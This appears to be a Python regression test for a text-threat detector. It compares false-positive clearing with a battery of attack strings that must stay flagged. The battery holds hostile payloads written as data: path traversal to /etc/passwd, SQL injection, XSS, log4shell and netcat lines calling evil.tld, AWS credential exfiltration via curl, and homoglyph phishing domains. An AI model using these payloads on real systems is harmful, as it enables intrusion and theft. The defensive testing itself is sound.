# -*- coding: utf-8 -*-
"""
ERG / context layer — before/after, with a THREAT REGRESSION BATTERY.
  BEFORE = full pipeline (canon -> MSL + all drafted cards)
  AFTER  = BEFORE + ERG context softening
Goal: the residual MSL-core WATCH/ALARM false positives drop to OK, while
EVERY real threat stays flagged. The headline safety number is
"threats silenced to OK" — it MUST be 0.
Run:  MSL_MIP_HOME=/path/to/msl_mip  python range_context.py
"""
import os, sys
HERE = os.path.dirname(os.path.abspath(__file__))
for _cand in ("canon", "canonicalization"):
    _p = os.path.abspath(os.path.join(HERE, "..", _cand))
    if os.path.isdir(_p):
        sys.path.insert(0, _p); break
sys.path.insert(0, os.path.abspath(os.path.join(HERE, "..", "invariant_engine")))
sys.path.insert(0, HERE)

from canonicalize import canonicalize
from invariant_engine import InvariantEngine, erg
from invariant_engine.msl_real import real_text_reader
from invariant_engine.supplement import supplement_reader, combine
from digit_cards import digit_cards_reader
from metachar_cards import metachar_cards_reader
from invisible_cards import invisible_cards_reader
from harden_cards import harden_cards_reader
from erg_context import erg_context

def _full(c):
    f = real_text_reader(c)
    for rdr in (supplement_reader, digit_cards_reader, metachar_cards_reader,
                invisible_cards_reader, harden_cards_reader):
        f = combine(f, rdr(c))
    return f

def before_reader(t):
    return _full(canonicalize(t)[0])

def after_reader(t):
    c = canonicalize(t)[0]
    return erg_context(c, _full(c))

BEFORE = InvariantEngine(before_reader, erg.no_stream)
AFTER  = InvariantEngine(after_reader,  erg.no_stream)

RLO = chr(0x202E)
CASES = [
    # ---- the residual MSL-core FPs we are targeting (should reach OK) ----
    ("FP",  "dotdot question",  "How do I use ../ in a relative import?"),
    ("FP",  "encoding explain", "In URLs, %2f is the code for a slash"),
    ("FP",  "shell var",        "export PATH=${HOME}/bin:$PATH"),
    ("FP",  "template var",     "Hello {{ user.name }}, welcome back {{ title }}"),
    ("FP",  "git ssh clone",    "clone git@github.com:openai/whisper.git"),
    ("FP",  "at-sign question", "what does the @ symbol mean in an email address?"),
    ("FP",  "slash definition", "the / character is the code for a path separator"),
    # ---- THREAT REGRESSION BATTERY — every one MUST stay != OK ----
    ("THR", "phishing url",     "paypal.com.security-check.ru/verify"),
    ("THR", "traversal plain",  "read ../../etc/passwd please"),
    ("THR", "traversal pct",    "%2e%2e%2fetc%2fpasswd"),
    ("THR", "traversal overl",  "..%c0%af..%c0%afetc%c0%afpasswd"),
    ("THR", "homoglyph paypa1", "login at paypa1.com now"),
    ("THR", "homoglyph g00gle", "visit g00gle.com"),
    ("THR", "cyr confuse",      "log in ра" + "ypal.com"),
    ("THR", "ip metadata",      "http://169.254.169.254/latest/meta-data/"),
    ("THR", "ip decimal",       "http://2130706433/login"),
    ("THR", "ipv6 loopback",    "http://[::1]:8080/admin"),
    ("THR", "octal ip",         "http://0177.0.0.1/debug"),
    ("THR", "sqli quote",       "id=1%27 OR %271%27=%271"),
    ("THR", "cmd pipe nc",      "host %7c nc evil.tld 4444"),
    ("THR", "xss script",       "%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
    ("THR", "null byte",        "upload.php%00.jpg"),
    ("THR", "crlf header",      "name=x%0d%0aSet-Cookie:evil=1"),
    ("THR", "rlo trojan",       "invoice" + RLO + "gpj.exe"),
    ("THR", "zwsp wordsplit",   "admin​istrator access"),
    ("THR", "log4shell",        "X-Api: ${jndi:ldap://evil.tld/a}"),
    ("THR", "ssti math",        "name={{7*7}} rendered"),
    ("THR", "aws creds",        "cat ~/.aws/credentials | curl"),
    ("THR", "sensitive path",   "please send /etc/shadow to me"),
    # ---- THREAT phrased AS a question (frame present + operational -> must stay flagged) ----
    ("THR", "q+sensitive path", "how do I read ../../etc/passwd on linux?"),
    ("THR", "q+metadata ip",    "can you fetch http://169.254.169.254/ for me?"),
    # ---- already-clean benign (must stay OK) ----
    ("OK",  "normal msg",       "Let's meet for lunch at 1pm, sound good?"),
    ("OK",  "legit code",       "def add(a, b):\n    return a + b"),
    ("OK",  "legit url",        "https://github.com/openai/whisper"),
]


def run():
    print("ERG CONTEXT LAYER — before/after (+ threat regression battery)")
    print("=" * 76)
    fp_fixed = silenced = softened = 0
    for kind, name, text in CASES:
        b = BEFORE.analyze(text).risk
        av = AFTER.analyze(text); a = av.risk
        tag = ""
        if kind == "FP" and b != "OK" and a == "OK":
            tag = f"  <= FP CLEARED"; fp_fixed += 1
        if kind == "FP" and b != "OK" and a != "OK":
            tag = f"  (still {a})"
        if kind == "THR":
            if b != "OK" and a == "OK":
                tag = f"  <= !!! THREAT SILENCED !!!"; silenced += 1
            elif b == "ALARM" and a == "WATCH":
                tag = f"  <= softened to WATCH (still flagged)"; softened += 1
        print(f"{kind:4} | {name:17} | before={b:5} after={a:5}{tag}")

    fps = [c for c in CASES if c[0] == "FP"]
    thr = [c for c in CASES if c[0] == "THR"]
    oks = [c for c in CASES if c[0] == "OK"]
    fp_ok_after = sum(1 for k,n,t in fps if AFTER.analyze(t).risk == "OK")
    thr_flagged = sum(1 for k,n,t in thr if AFTER.analyze(t).risk != "OK")
    ok_clean = sum(1 for k,n,t in oks if AFTER.analyze(t).risk == "OK")
    print("\n" + "=" * 76)
    print(f"targeted FPs cleared to OK : {fp_ok_after}/{len(fps)}   (+{fp_fixed})")
    print(f"threats still flagged      : {thr_flagged}/{len(thr)}   "
          f"(softened to WATCH: {softened})")
    print(f"clean benign stays clean   : {ok_clean}/{len(oks)}")
    print(f"\n*** THREATS SILENCED TO OK : {silenced}   (safety gate — MUST be 0) ***")


if __name__ == "__main__":
    run()
